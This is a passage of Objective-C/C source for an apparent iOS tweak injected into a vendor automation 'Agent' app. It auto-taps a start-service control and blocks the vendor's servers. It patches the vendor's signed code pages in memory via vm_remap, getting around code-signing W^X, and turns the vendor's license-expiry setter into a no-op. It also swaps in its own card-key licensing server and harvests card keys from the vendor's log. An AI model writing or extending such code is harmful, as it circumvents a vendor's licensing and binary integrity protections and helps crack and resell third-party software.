//      走 App 自己的启动链路（会话协商齐全）；已 ON 则只消费标记不动开关。
//   ② 兜底 —— UIButton title/accessibilityLabel 含「启动服务」→ 模拟 TouchUpInside。
- (BOOL)as_scanViews:(id)views {
    if (!views) return NO;
    id btnCls = NSClassFromString(@"UIButton");
    id lblCls = NSClassFromString(@"UILabel");
    id swCls  = NSClassFromString(@"UISwitch");

    // ① UISwitch 开关路径
    if (swCls && lblCls) {
        BOOL hasLabel = NO;
        id<BSAutoUI> sw = nil;
        for (id<BSAutoUI> v in views) {
            if (!v || [v isHidden]) continue;
            if ([v isKindOfClass:lblCls]) {
                NSString *t = [v text];
                if (t && [t rangeOfString:@"启动服务"].location != NSNotFound) hasLabel = YES;
            } else if (!sw && [v isKindOfClass:swCls]) {
                sw = v;
            }
        }
        if (hasLabel && sw) {
            if ([sw isOn]) {
                bs_log("[autosvc] start-service switch already ON -> consume marker (no-op)");
            } else {
                [(id)sw setOn:YES animated:NO];
                [(id)sw sendActionsForControlEvents:(NSUInteger)4096]; // UIControlEventValueChanged
                bs_log("[autosvc] start-service switch -> set ON + valueChanged sent");
            }
            return YES;
        }
    }

    // ② UIButton 兜底
    for (id<BSAutoUI> v in views) {
        if (!v) continue;
        if (btnCls && [v isKindOfClass:btnCls]) {
            if ([v isHidden]) continue;
            if ([v alpha] < 0.05) continue;
            NSString *t  = [v currentTitle];
            NSString *lb = [v accessibilityLabel];
            BOOL hit = NO;
            if (t  && [t  rangeOfString:@"启动服务"].location != NSNotFound) hit = YES;
            if (!hit && lb && [lb rangeOfString:@"启动服务"].location != NSNotFound) hit = YES;
            if (!hit) continue;
            bs_log("[autosvc] button found -> tap (title=%s)", t ? [t UTF8String] : "?");
            [v sendActionsForControlEvents:(NSUInteger)64];   // UIControlEventTouchUpInside
            return YES;
        }
        if ([self as_scanViews:[v subviews]]) return YES;
    }
    return NO;
}

- (BOOL)as_tryTap {
    id appCls = NSClassFromString(@"UIApplication");
    if (!appCls) return NO;
    id app = [(id)appCls sharedApplication];
    if (!app) return NO;
    NSArray *wins = [(id<BSAutoUI>)app windows];
    if (!wins) return NO;
    // ★ 诊断：窗口清单 + rootVC 链（tries 1）；UI 树 dump（tries 1/2/30）
    if (g_as_tries == 1) {
        bs_log("[autosvc] windows=%lu", (unsigned long)wins.count);
        for (id w in wins) {
            id<BSAutoUI> ww = (id<BSAutoUI>)w;
            id root = [ww rootViewController];
            id pres = root ? [(id)root presentedViewController] : nil;
            bs_log("[autosvc] win key=%d hidden=%d rootVC=%s presented=%s",
                   [ww isKeyWindow] ? 1 : 0, [ww isHidden] ? 1 : 0,
                   root ? NSStringFromClass([root class]).UTF8String : "nil",
                   pres ? NSStringFromClass([pres class]).UTF8String : "nil");
        }
    }
    if (g_as_tries <= 2 || g_as_tries == 30) {
        g_as_dumpln = 0;
        for (id w in wins) [self as_dump:[w subviews] depth:0];
        bs_log("[autosvc] UI dump done (tries=%d, lines=%d)", g_as_tries, g_as_dumpln);
    }
    for (id w in wins) {
        if ([self as_scanViews:[w subviews]]) return YES;
    }
    return NO;
}

// 递归打印视图树（cap 100 行防日志爆）
- (void)as_dump:(id)views depth:(int)d {
    if (d > 7 || !views || g_as_dumpln > 100) return;
    id btnCls  = NSClassFromString(@"UIButton");
    id lblCls  = NSClassFromString(@"UILabel");
    id swCls   = NSClassFromString(@"UISwitch");
    for (id<BSAutoUI> v in views) {
        if (!v) continue;
        if (g_as_dumpln > 100) return;
        NSString *cls = NSStringFromClass([v class]);
        NSMutableString *info = [NSMutableString stringWithFormat:@"d%d %@", d, cls];
        if (btnCls && [v isKindOfClass:btnCls]) {
            NSString *t = [v currentTitle];
            if (t.length) [info appendFormat:@" title=%@", t];
        }
        if (lblCls && [v isKindOfClass:lblCls]) {
            NSString *t = [v text];
            if (t.length) [info appendFormat:@" text=%@", t];
        }
        if (swCls && [v isKindOfClass:swCls]) {
            [info appendString:@" <SWITCH>"];
        }
        NSString *lb = [v accessibilityLabel];
        if (lb.length) [info appendFormat:@" label=%@", lb];
        g_as_dumpln++;
        bs_log("[autosvc][dump] %s", [info UTF8String]);
        [self as_dump:[v subviews] depth:d + 1];
    }
}

- (void)as_tick:(id)timer {
    // ★ v6.24j：标记可能已被别的 kickoff 消费（App 多次激活）→ 收尾
    char cur[64];
    if (!bs_autosvc_pending(cur, sizeof(cur))) {
        bs_log("[autosvc] marker gone -> stop tapping");
        g_as_busy = 0;
        [timer invalidate];
        return;
    }
    g_as_tries++;
    if (g_as_tries > 60) {
        bs_log("[autosvc] give up after %d tries (button not found; marker kept, retry next app start)",
               g_as_tries);
        g_as_busy = 0;
        [timer invalidate];
        return;
    }
    if ([self as_tryTap]) {
        char pend[300], done[340];
        snprintf(pend, sizeof(pend), DATA_DIR "/.autosvc_pending");
        snprintf(done, sizeof(done), DATA_DIR "/.autosvc_done_%ld", (long)time(NULL));
        if (rename(pend, done) == 0)
            bs_log("[autosvc] tapped OK -> marker consumed, service should be starting");
        else
            bs_log("[autosvc] tapped but rename failed (errno=%d)", errno);
        g_as_busy = 0;
        [timer invalidate];
        return;
    }
    // 未命中：repeats=YES 自动下一拍
}

// ★ v6.24j：App 每次「进入前台」都重新尝试 —— 装包后 App 若已在后台，
//   冷启/切前台这一下才会把「启动服务」开关点下去。
- (void)as_active:(id)note {
    char cur[64];
    if (!bs_autosvc_pending(cur, sizeof(cur))) return;
    if (g_as_busy) {
        bs_log("[autosvc] did-become-active, tap already in progress (tries=%d)", g_as_tries);
        return;
    }
    bs_log("[autosvc] did-become-active with pending marker -> kickoff again");
    [self as_setup];
}

- (void)as_setup {
    g_as_busy = 1;
    g_as_tries = 0;
    NSTimer *t = [NSTimer timerWithTimeInterval:2.0
                                         target:self
                                       selector:@selector(as_tick:)
                                       userInfo:nil
                                        repeats:YES];
    [[NSRunLoop mainRunLoop] addTimer:t forMode:NSRunLoopCommonModes];
}

+ (void)as_kickoff {
    BSAutosvcHelper *h = [[BSAutosvcHelper alloc] init];
    g_as_helper = h;   // 常驻引用（timer 也 retain target）
    // ★ v6.24j：激活通知在后台线程注册（不碰 dyld/ObjC 冷启动期），
    //   收到后 onMainThread 起定时器 —— 覆盖「装包时 App 已在后台」的场景。
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_LOW, 0), ^{
        @autoreleasepool {
            [[NSNotificationCenter defaultCenter]
                addObserver:g_as_helper
                   selector:@selector(as_active:)
                       name:@"UIApplicationDidBecomeActiveNotification"
                     object:nil];
        }
    });
    [h performSelectorOnMainThread:@selector(as_setup) withObject:nil waitUntilDone:NO];
}

@end
// ══════════════════════════════════════════════════════════════════════

static void *bs_block_init(void *arg) {
    (void)arg;
    // ★ v6.23v：App 进程不装 net block —— 只在 Agent 进程屏蔽厂商服务器。
    //   App 的中控连接（server2 34878）与厂商心跳路径不明的，宁可不动。
    if (bs_proc_is_app()) return NULL;
    char mode[24] = {0};
    int bv = 1;
    // ★ v6.23r 修复：快扫原来读 DATA_DIR/bs_pull.conf（App 数据目录，通常不存在），
    //   导致 fp=NULL → bv 缺省 1 + mode 空 → probe 例外永不生效，每次启动都装 block。
    //   真实 conf 在 PULL_CONF（Media 根）。改为先读 PULL_CONF，读不到再回落 DATA_DIR
    //   （兼容曾把 conf 放 App 数据目录的设备）。
    FILE *fp = fopen(PULL_CONF, "r");
    if (!fp) fp = fopen(DATA_DIR "/bs_pull.conf", "r");
    if (fp) {
        char line[256];
        while (fgets(line, sizeof(line), fp)) {
            char *eq = strchr(line, '=');
            if (!eq) continue;
            *eq = 0;
            char *v = eq + 1;
            char *nl = strchr(v, '\n');
            if (nl) *nl = 0;
            char *cr = strchr(v, '\r');
            if (cr) *cr = 0;
            if (!strcmp(line, "mode")) {
                snprintf(mode, sizeof(mode), "%s", v);
            } else if (!strcmp(line, "blockvps")) {
                bv = atoi(v) ? 1 : 0;
            }
        }
        fclose(fp);
    }
    if (!bv) {
        bs_log("[blk] blockvps=0 -> net block skipped");
        return NULL;
    }
    if (!strcmp(mode, "probe")) {
        bs_log("[blk] probe mode (real card) -> no block");
        return NULL;
    }
    bs_install_net_block();
    return NULL;
}

// ════════════════════════════════════════════════════════════════════
// ★★★ v6.20 自有卡密系统（CardVault v2 统一协议） — [card] 前缀
// ════════════════════════════════════════════════════════════════════

static void bs_card_cache_save(void) {
    char path[300];
    snprintf(path, sizeof(path), "%s/bs_card.txt", DATA_DIR);
    FILE *f = fopen(path, "w");
    if (!f) return;
    // ★ v6.23t：kicked/kickts 一并落盘 —— 被踢设备重启后内存拉黑会丢，
    //   而 agent.log 尾部扫描（无 offset）仍能抓到同一卡号 → 会以 act=new
    //   抢回，与接管方 60s 心跳互踢。落盘后重启仍拉黑，须真输入才解除。
    fprintf(f, "expire=%ld\nlastok=%ld\ncard=%s\nkicked=%s\nkickts=%ld\n",
            g_card_expire, g_card_lastok, g_card_cur, g_card_kicked, g_card_kickts);
    fclose(f);
}

static void bs_card_cache_load(void) {
    char path[300];
    snprintf(path, sizeof(path), "%s/bs_card.txt", DATA_DIR);
    FILE *f = fopen(path, "r");
    if (!f) return;
    char line[160];
    while (fgets(line, sizeof(line), f)) {
        char *nl = strchr(line, '\n');
        if (nl) *nl = 0;
        if (!strncmp(line, "expire=", 7))  g_card_expire = strtol(line + 7, NULL, 10);
        if (!strncmp(line, "lastok=", 7)) g_card_lastok = strtol(line + 7, NULL, 10);
        if (!strncmp(line, "card=", 5))   snprintf(g_card_cur, sizeof(g_card_cur), "%s", line + 5);
        if (!strncmp(line, "kicked=", 7)) snprintf(g_card_kicked, sizeof(g_card_kicked), "%s", line + 7);
        if (!strncmp(line, "kickts=", 7)) g_card_kickts = strtol(line + 7, NULL, 10);
    }
    fclose(f);
    bs_log("[card] cache loaded expire=%ld lastok=%ld card=%.20s... kicked=%.20s (%ld)",
           g_card_expire, g_card_lastok, g_card_cur, g_card_kicked, g_card_kickts);
}

/// device_id：优先硬件序列号（卸载重装不变），回退 token。
/// ★ v6.23j：hw.serial 在部分机型/环境返回**字面量 "unknown"**（非空字符串），
///   旧写法直接采信 → device_id="unknown" 存进绑定字段；且所有此类设备
///   共享同一 id，绑定比对 unknown==unknown 恒过 ⇒ 一张卡可被多台设备共享！
///   现把 "unknown" 当无效 → 回退 g_token（postinst 每机唯一）；
///   两者皆无才退到 "unknown"（最后兜底，正常不会走到）。
static void bs_card_device_id(void) {
    char srl[64] = {0};
    memset(g_card_devid, 0, sizeof(g_card_devid));
    bs_sysctl_str("hw.serial", srl, sizeof(srl));
    if (srl[0] && strcmp(srl, "unknown") != 0)
        snprintf(g_card_devid, sizeof(g_card_devid), "%s", srl);
    if (!g_card_devid[0] && g_token[0])
        snprintf(g_card_devid, sizeof(g_card_devid), "%s", g_token);
    if (!g_card_devid[0])
        snprintf(g_card_devid, sizeof(g_card_devid), "unknown");
    bs_log("[card] device_id=%.24s (serial=%s)", g_card_devid,
           srl[0] ? srl : "(empty)");
}

/// 解析 /api/client/login 响应：只认 body 的 code（HTTP 状态码不可靠，文档 §9.1）。
/// 返回 code；expires_ts 经 out_exp 回写（解析不到=-1）。
static long bs_card_parse(const unsigned char *resp, size_t rn, long long *out_exp,
                          char *out_msg, size_t msgn) {
    *out_exp = -1;
    if (out_msg && msgn) out_msg[0] = 0;
    if (!resp || rn == 0) return -1;
    char *s = (char *)resp;
    s[rn] = 0;   // malloc(n+1) 保证有终止符位置

    long code = -1;
    // ★ v6.23e 修复：旧写法 strtol(p+6) 从冒号起 parse —— strtol(":2") 无有效数字
    //   **恒返回 0** ⇒ 任何业务失败（冻结2/过期3/绑定冲突5…）都被当成功！
    //   （实测 2026-10-03：冻结卡 4 拍心跳全部 login OK 的真根因。）
    //   改为先找 ':' 再取数字，与 expires_ts 的解析写法对齐。
    const char *p = strstr(s, "\"code\"");
    if (p) {
        const char *d = strchr(p + 6, ':');
        if (d) code = strtol(d + 1, NULL, 10);
    }

    p = strstr(s, "\"expires_ts\"");
    if (p) {
        const char *d = strchr(p + 12, ':');
        if (d) *out_exp = strtoll(d + 1, NULL, 10);
    }
    p = strstr(s, "\"message\"");
    if (p && out_msg) {
        const char *q = strchr(p + 9, '"');
        if (q) {
            q++;
            size_t i = 0;
            while (q[i] && q[i] != '"' && i + 1 < msgn) { out_msg[i] = q[i]; i++; }
            out_msg[i] = 0;
        }
    }
    return code;
}

/// 发 login：激活/续期/心跳三合一（幂等，重试不重复扣时长）。
/// ★ v6.22：把 CardVault 真实到期同步进厂商全局 g_agent_auth_valid_time（int32）。
/// 厂商 setter 已被 5 点补丁硬编码 0x7FFF0000（2038）→ 绕过 setter 直接写全局；
/// 反汇编实证全二进制唯一写点就是该 setter，本函数每 tick 重校准自愈。
static volatile int *g_vend_vt = NULL;

/// ★ v6.23b：文本页补丁通道 —— mprotect 对签名 __TEXT 页被内核拒
///（errno=13，代码签名 W^X 强制），改用 mach_vm_remap OVERWRITE 整页替换
///（ellekit 同款）：临时页改好字 → 重映射覆盖 → icache 失效。
static int bs_patch_text_word(uintptr_t va, uint32_t word) {
    mach_port_t self = mach_task_self();
    // ★ v6.23d：iOS arm64 用户态页大小 = 16KB（不是 4KB！）。
    //   v6.23c 用 0x1000 对齐 → vm_remap 把非 16K 对齐 dst 向下圆整，
    //   覆盖整个 16K 页但 tmp 只装了错位 4K → 页内容错乱 SIGILL
    //   （.45 14:58 实锤：get_agent_activate_card+0 非法指令）。
    //   必须按 sysconf(_SC_PAGESIZE) 真实页大小对齐/复制/重映射。
    const vm_size_t PGSZ = (vm_size_t)sysconf(_SC_PAGESIZE);
    vm_address_t page_a = (vm_address_t)(va & ~((vm_address_t)PGSZ - 1));

    vm_address_t tmp = 0;
    kern_return_t kr = vm_allocate(self, &tmp, PGSZ, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        bs_log("[card] text patch: vm_allocate fail kr=%d", kr);
        return -1;
    }
    memcpy((void *)(uintptr_t)tmp, (const void *)page_a, (size_t)PGSZ);
    *(volatile uint32_t *)(uintptr_t)(tmp + (va - page_a)) = word;

    // ★ v6.23c：remap 目标页会继承源页保护——先把临时页转成 r-x（写已完成，
    //   收紧到 RX 是 W^X 允许的方向），否则 remap 后目标页 rw- 不可执行，
    //   厂商线程一进该页即 SIGBUS（.45 14:48 实锤：get_agent_activate_card
    //   Instruction Abort, 页 cur=rw-）。
    if (mprotect((void *)(uintptr_t)tmp, (size_t)PGSZ, PROT_READ | PROT_EXEC) != 0)
        bs_log("[card] text patch: tmp mprotect RX fail errno=%d", errno);

    vm_address_t dst = page_a;
    vm_prot_t cur = 0, mx = 0;
    kr = vm_remap(self, &dst, PGSZ, 0, VM_FLAGS_OVERWRITE,
                  self, tmp, FALSE, &cur, &mx, VM_INHERIT_COPY);
    vm_deallocate(self, tmp, PGSZ);
    if (kr != KERN_SUCCESS) {
        bs_log("[card] text patch: vm_remap fail kr=%d", kr);
        return -1;
    }
    // 双保险：目标页恢复 r-x（max=rwx 内收紧必然允许；若 tmp 转换失败这里兜底）
    if (mprotect((void *)(uintptr_t)page_a, (size_t)PGSZ, PROT_READ | PROT_EXEC) != 0)
        bs_log("[card] text patch: dst mprotect RX fail errno=%d (cur=%d mx=%d)",
               errno, cur, mx);
    sys_icache_invalidate((void *)va, 4);
    return 0;
}

/// ★ v6.23：中和厂商 set_agent_auth_valid_time（静态 vmaddr 0x10000d94c）。
/// 厂商状态机每 3~15s 调它一次 → 补丁版恒写 0x7FFF0000（2038）→ v6.22 的
/// 同步值被周期性覆盖、显示抖动。入口写 ARM64 `ret` 让调用变空操作后，
/// g_agent_auth_valid_time 只剩 cardwatch 一个写者，显示恒定。
/// 仅 unlock 模式调用（probe 真卡机绝不动厂商代码）。
static void bs_neutralize_vt_setter(uintptr_t base) {
    uintptr_t va = base + 0xd94c;                 // __TEXT vmaddr 0x100000000 起
    static const uint32_t ARM64_RET = 0xd65f03c0u;
    if (bs_patch_text_word(va, ARM64_RET) == 0)
        bs_log("[card] vt setter neutralized (ret @ +0xd94c) -> display ours");
}

static void bs_sync_vendor_expire(void) {
    if (!g_vend_vt) {
        int *p = (int *)dlsym(RTLD_DEFAULT, "g_agent_auth_valid_time");
        if (!p) return;
        g_vend_vt = (volatile int *)p;
        bs_log("[card] vendor valid_time found, now=%d", (int)*g_vend_vt);
    }
    // expire>0 → 写真实到期；expire<=0（未激活/业务失败封禁）→ 写 0（显示已过期，
    // 如实反映卡状态，不再残留 2038 假象）
    int want = (g_card_expire > 0) ? (int)g_card_expire : 0;
    if (*g_vend_vt != want) {
        int oldv = (int)*g_vend_vt;
        *g_vend_vt = want;
        bs_log("[card] valid_time %d -> %d (CardVault expire sync)", oldv, want);
    }
}

/// ★ v6.23i：清空厂商 onion 字典（封禁期每拍调用）。
/// 字典 = static vmaddr OFF_ONION_DICT 处的 NSMutableDictionary*（name -> NSData 模块代码）。
/// 不清的后果：中控一点运行，厂商脚本引擎直接用封禁前注入的旧模块跑
/// （.45 2026-10-03 删卡实测）。厂商在 _bb_init_script_player 里会整体换新
/// 字典对象 —— 换了自然空；没换我们清。类型不符（不可变字典等）不动，防异常。
/// ★ 有意保留「有内容才打日志」：若厂商/中控在封禁期重灌字典，这里会连续
///   打出条数 —— 那就是「存在绕过我们的脚本下发通道」的实证信号。
static void bs_wipe_onion_dict(uintptr_t base) {
    if (!base) return;
    @autoreleasepool {
        void *dp = *(void **)(base + OFF_ONION_DICT);
        if (!dp) return;
        NSMutableDictionary *dict = (__bridge NSMutableDictionary *)dp;
        if (![dict isKindOfClass:[NSMutableDictionary class]]) return;
        NSUInteger n = [dict count];
        if (n > 0) {
            [dict removeAllObjects];
            bs_log("[card] onion dict wiped (%lu module(s) cleared)", (unsigned long)n);
        }
    }
}

/// 返回 0=ok（g_card_expire 已更新）；-1=网络失败；业务码原值返回。
static long bs_card_login(const char *card, int act_new) {
    char url[256];
    snprintf(url, sizeof(url), "http://%s%s", g_card_host, CARD_PATH);

    // ★ v6.23s：act=new 仅激活（卡变更）携带 —— 服务端 bsmod v3.10 据此区分
    //   「真换卡接管」与「心跳」，心跳绝不带 act（防两台互抢振荡）
    char body[280];
    unsigned long long nonce = (unsigned long long)time(NULL) << 17
                             ^ (unsigned long long)(uintptr_t)&nonce;
    if (act_new)
        snprintf(body, sizeof(body),
                 "{\"card\":\"%s\",\"device_id\":\"%s\",\"nonce\":\"%016llx\","
                 "\"act\":\"new\"}",
                 card, g_card_devid, nonce & 0xFFFFFFFFFFFFFFFFULL);
    else
        snprintf(body, sizeof(body),
                 "{\"card\":\"%s\",\"device_id\":\"%s\",\"nonce\":\"%016llx\"}",
                 card, g_card_devid, nonce & 0xFFFFFFFFFFFFFFFFULL);

    size_t rn = 0;
    long code = 0;
    unsigned char *rb = bs_http_post_key(url, "application/json", g_card_key,
                                         body, strlen(body), &rn, &code);
    if (!rb) {
        bs_log("[card] network fail (no response)");
        return -1;
    }
    long long exp = -1;
    char msg[64] = {0};
    long rc = bs_card_parse(rb, rn, &exp, msg, sizeof(msg));
    free(rb);

    if (rc == 0) {
        if (exp > 0) g_card_expire = (long)exp;
        g_card_lastok = (long)time(NULL);
        bs_log("[card] login OK expire=%ld (%.20s...)", g_card_expire, card);
        bs_sync_vendor_expire();          // ★ v6.22：激活即同步中控显示
    } else {
        bs_log("[card] login FAIL code=%ld msg=%s (http=%ld)", rc, msg, code);
    }
    return rc;
}

/// 卡密状态机主循环。3s 一拍：读卡密 → 变更即激活 → cardtick 到点心跳 → 维护封禁态。
static void *bs_cardwatch(void *arg) {
    uintptr_t base = (uintptr_t)arg;
    bs_card_device_id();
    bs_card_cache_load();
    bs_neutralize_vt_setter(base);                // ★ v6.23：厂商 setter 变空操作

    // 解析 Agent 的卡密 getter（厂商符号表暴露，get_* 系列优先）
    typedef char *(*get_str_fn)(void);
    get_str_fn fn_get_card = (get_str_fn)dlsym(RTLD_DEFAULT, "get_agent_activate_card");
    void *gbuf = dlsym(RTLD_DEFAULT, "g_agent_activate_card");
    bs_log("[card] watch start devid=%s tick=%ds grace=%dh getter=%s buf=%s",
           g_card_devid, g_cardtick, g_cardgrace,
           fn_get_card ? "fn" : "none", gbuf ? "yes" : "no");
    if (!fn_get_card && !gbuf) {
        bs_log("[card] no symbol access -> cardcheck disabled this session");
        return NULL;
    }

    int prev_blocked = -1;   // 首轮强制评估
    long last_check  = 0;

    for (;;) {
        sleep(3);
        long now = (long)time(NULL);

        // ---- v6.21 ①：agent.log 捕获中控输入的卡密（主通道，尾部扫描自愈版） ----
        // 厂商流程：中控输卡 → Agent 打 "begin process activate card!" + 卡号行
        //（厂商验卡失败不写内存全局 → getter 读空）。每 tick 扫 agent.log 末尾
        // 64KB，取**最后一次**激活事件的卡号 —— 无 offset 状态，丢不了增量。
        static char   lg_card[80] = {0};
        static long   lg_ts       = 0;    // ★ v6.23t 该次激活事件的时间戳（行首 [Y/M/D H:M:S]）
        static int    lg_seen = 0;        // 首次成功扫到文件时打一次性诊断
        struct stat lst;
        if (stat(DATA_DIR "/log/agent.log", &lst) == 0 && lst.st_size > 0) {
            long rd = (lst.st_size > 65536) ? 65536 : (long)lst.st_size;
            FILE *lf = fopen(DATA_DIR "/log/agent.log", "rb");
            const char *hit = NULL;
            if (lf) {
                int ok = (fseek(lf, lst.st_size - rd, SEEK_SET) == 0);
                if (ok) {
                    char *buf = malloc((size_t)rd + 1);
                    if (buf) {
                        size_t got = fread(buf, 1, (size_t)rd, lf);
                        buf[got] = 0;
                        const char *sig = "begin process activate card!";
                        const char *p   = buf;
                        while ((p = strstr(p, sig)) != NULL) { hit = p; p += 8; }
                        if (hit) {
                            const char *cl = strchr(hit, '\n');
                            if (cl) {
                                cl++;                       // 卡号行首
                                // ★ v6.23t：解析行首 "[YYYY/MM/DD HH:MM:SS] " —— 用于区分
                                //   「真重新输入」（时间戳晚于被踢时刻）与「日志残留兜底」。
                                long evt_ts = 0;
                                if (cl[0] == '[') {
                                    int Y=0,Mo=0,D=0,h=0,mi=0,se=0;
                                    if (sscanf(cl, "[%d/%d/%d %d:%d:%d]",
                                               &Y,&Mo,&D,&h,&mi,&se) == 6) {
                                        struct tm tmv;
                                        memset(&tmv, 0, sizeof(tmv));
                                        tmv.tm_year = Y - 1900; tmv.tm_mon = Mo - 1;
                                        tmv.tm_mday = D; tmv.tm_hour = h;
                                        tmv.tm_min  = mi; tmv.tm_sec = se;
                                        evt_ts = (long)mktime(&tmv);
                                    }
                                }
                                size_t cn = 0;
                                while (cl[cn] && cl[cn] != '\n' && cl[cn] != '\r') cn++;
                                // ★ v6.21c：卡号 = 行内**末尾连续** [0-9A-Z] 段。
                                //   实测（.45 02:16 od）厂商在卡号行前**也打了时间戳
                                //   前缀** "[2026/10/03 02:16:31] "，整行 49B 直接
                                //   校验必挂（v6.21/v6.21b 静默失效的真根因）。
                                size_t end = cn;
                                while (end > 0 &&
                                       !((cl[end-1] >= '0' && cl[end-1] <= '9') ||
                                         (cl[end-1] >= 'A' && cl[end-1] <= 'Z'))) end--;
                                size_t beg = end;
                                while (beg > 0 &&
                                       (((cl[beg-1] >= '0' && cl[beg-1] <= '9')) ||
                                        ((cl[beg-1] >= 'A' && cl[beg-1] <= 'Z')))) beg--;
                                size_t klen = end - beg;
                                if (klen >= 8 && klen <= 40) {
                                    // ★ v6.23t：卡号相同但时间戳更新 = 又重新输了一次同一张卡
                                    //   （尾部扫描无 offset，每 tick 都命中同一行 —— 时间戳不变
                                    //   故不会反复刷日志）。旧条件只看卡号变化，会漏掉这个场景。
                                    int is_new = (strncmp(lg_card, cl + beg, klen) != 0 ||
                                                  lg_card[klen]);
                                    int ts_new = (evt_ts > 0 && evt_ts > lg_ts);
                                    if (is_new || ts_new) {
                                        if (is_new)
                                            snprintf(lg_card, sizeof(lg_card), "%.*s",
                                                     (int)klen, cl + beg);
                                        lg_ts = evt_ts;              // ★ v6.23t
                                        bs_log("[card] captured from agent.log: %.32s (ts=%ld)",
                                               lg_card, lg_ts);
                                    }
                                }
                            }
                        }
                        free(buf);
                    }
                }
                fclose(lf);
                if (!lg_seen) {
                    lg_seen = 1;
                    bs_log("[card] tail scan init ok (size=%ld hit=%s)",
                           (long)lst.st_size, hit ? "yes" : "no");
                }
            }
        }

        // ---- 读当前卡密（★ v6.21 卡源优先级：内存 getter > 日志捕获 > conf cardval） ----
        char card[80] = {0};
        if (fn_get_card) {
            char *p = fn_get_card();
            if (p) snprintf(card, sizeof(card), "%s", p);
        } else if (gbuf) {
            snprintf(card, sizeof(card), "%s", (const char *)gbuf);
        }

        int have_card = card[0] != 0;
        if (!have_card && lg_card[0]) {
            snprintf(card, sizeof(card), "%s", lg_card);      // v6.21：日志捕获兜底
            have_card = 1;
        }
        if (!have_card && g_cardval[0]) {
            snprintf(card, sizeof(card), "%s", g_cardval);    // v6.21：conf 手动卡兜底
            have_card = 1;
        }
        if (!have_card && g_card_cur[0]) {
            // ★ v6.23f：缓存卡兜底。重启后厂商内存卡清空、日志截断、无 cardval
            //   时，否则心跳永不发出（脱机永动，拉黑/冻结全部失效）。
            snprintf(card, sizeof(card), "%s", g_card_cur);
            have_card = 1;
            static int fb_logged = 0;
            if (!fb_logged) {
                fb_logged = 1;
                bs_log("[card] card source = cache fallback (%.24s...)", card);
            }
        }

        // ---- 卡密变化 → 立即激活（幂等；失败同卡 60s 节流重试） ----
        static char last_fail[80] = {0};
        static long last_try      = 0;
        if (have_card && strcmp(card, g_card_cur) != 0) {
            // ★ v6.23t：是否「真重新输入」—— 卡值来自日志捕获、且该激活事件的时间戳
            //   晚于被踢时刻。日志残留（旧行）时间戳必 ≤ kickts，不算真输入。
            int real_input = (lg_card[0] && strcmp(card, lg_card) == 0 &&
                              lg_ts > 0 && lg_ts > g_card_kickts);
            if (g_card_kicked[0] && strcmp(card, g_card_kicked) == 0 && !real_input) {
                // ★ v6.23s：被接管卡本地拉黑 —— 自动重试会以 act=new 抢回，
                //   与接管方 60s 心跳互踢振荡；静默等真输入（换卡或重启 App）
                static long last_kick_log = 0;
                if (now - last_kick_log >= 300) {
                    last_kick_log = now;
                    bs_log("[card] taken over card %.20s... blacklisted, "
                           "waiting for new input", card);
                }
            } else {
            if (real_input && g_card_kicked[0] && strcmp(card, g_card_kicked) == 0) {
                g_card_kicked[0] = 0;               // ★ v6.23t 真输入 → 解除拉黑
                g_card_kickts    = 0;
                bs_log("[card] newer input seen after kick -> unblock %.20s...", card);
            }
            int throttled = (last_fail[0] && !strcmp(card, last_fail) && now - last_try < 60);
            if (!throttled) {
                last_try = now;
                long rc = bs_card_login(card, 1);   // ★ v6.23s 激活带 act=new
                if (rc == 0) {
                    snprintf(g_card_cur, sizeof(g_card_cur), "%s", card);
                    last_fail[0] = 0;
                    g_card_kicked[0] = 0;           // ★ v6.23s 激活成功清拉黑
                    g_card_kickts    = 0;           // ★ v6.23t
                    bs_card_cache_save();
                } else if (rc > 0) {
                    // 业务失败：记住这张失败卡（节流用）；若与已绑卡相同
                    // （可能被解绑/冻结）→ 清缓存封禁
                    snprintf(last_fail, sizeof(last_fail), "%s", card);
                    if (rc == 7) {
                        // ★ v6.23s：卡在他机手里 → 本地拉黑 + 清缓存封禁
                        snprintf(g_card_kicked, sizeof(g_card_kicked), "%s", card);
                        g_card_kickts = now;                    // ★ v6.23t 记录被踢时刻
                        bs_log("[card] taken over by another device, "
                               "blocked: %.20s...", card);
                        g_card_cur[0] = 0;
                        g_card_expire = 0;
                        g_card_lastok = 0;
                        bs_card_cache_save();
                    } else if (g_card_cur[0] && strcmp(card, g_card_cur) == 0) {
                        g_card_cur[0] = 0;
                        g_card_expire = 0;
                        g_card_lastok = 0;
                        bs_card_cache_save();
                    }
                }
            }
            }
            last_check = now;
        }

        // ---- 心跳：到点重发 login（在线状态 + 到期刷新） ----
        if (have_card && g_card_cur[0] && now - last_check >= g_cardtick) {
            long rc = bs_card_login(g_card_cur, 0);   // ★ v6.23s 心跳不带 act
            if (rc == 0) {
                bs_card_cache_save();
            } else if (rc > 0) {
                // ★ v6.23s：本机卡被其他设备接管（code=7）→ 拉黑+清卡，
                //   静默停脚本等新输入；与冻结/过期不同（那些保留 g_card_cur
                //   以便解冻后自动恢复），接管必须停试防互抢振荡
                if (rc == 7) {
                    snprintf(g_card_kicked, sizeof(g_card_kicked), "%s", g_card_cur);
                    g_card_kickts = now;                    // ★ v6.23t 记录被踢时刻
                    bs_log("[card] taken over by another device, "
                           "blocked: %.20s...", g_card_cur);
                    g_card_cur[0] = 0;
                }
                // 心跳业务失败：卡被冻结/解绑/过期 → 立即封禁
                g_card_expire = 0;
                g_card_lastok = 0;
                bs_card_cache_save();
            }
            last_check = now;
        }

        // ---- 判决 ----
        // ★ v6.22：每 tick 把真实到期同步给厂商全局（中控显示一致性，自愈校准）
        bs_sync_vendor_expire();
        // 有效 = 已激活成功 且 未过到期时间
        int verdict_ok = 0;
        if (g_card_cur[0] && g_card_expire > 0 && now < g_card_expire) verdict_ok = 1;
        // 宽限：之前有效，只是网络不通（ expire 未知变化时保留 last_ok）
        if (!verdict_ok && g_card_expire > 0 && g_card_lastok > 0 &&
            now < g_card_lastok + (long)g_cardgrace * 3600) verdict_ok = 1;

        // 从未激活过 & 没有卡 → 封禁（cardcheck=1 的设备必须先输卡）
        int blocked = verdict_ok ? 0 : 1;

        if (blocked != prev_blocked) {
            if (blocked) {
                bs_log("[card] BLOCKED (verdict=invalid expire=%ld lastok=%ld) -> OPER_STOP + gates + wipe",
                       g_card_expire, g_card_lastok);
                if (base)
                    ((void (*)(int))(base + FN_SET_OPER))(OPER_STOP);
            } else {
                bs_log("[card] re-authorized (expire=%ld) -> gates open", g_card_expire);
            }
            prev_blocked = blocked;
        }
